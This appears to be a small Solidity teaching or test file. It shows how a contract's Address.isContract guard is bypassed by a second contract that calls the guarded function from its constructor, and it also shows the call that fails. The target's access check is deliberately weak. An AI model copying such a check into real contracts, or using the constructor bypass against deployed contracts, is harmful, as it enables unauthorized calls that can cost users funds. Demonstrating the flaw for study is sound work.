// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "@openzeppelin/contracts/utils/Address.sol";

contract Target {
  bool attackSucceded;

  function doStuff() public {
    require(!Address.isContract(msg.sender), 'no contracts allowed');

    attackSucceded = true;
  }
}

contract Attack {
  Target target;

  constructor(address _target) {
    target = Target(_target);

    // Performing attack here
    target.doStuff();
  }

  function doFailedAttack() public {
    target.doStuff();
  }
}
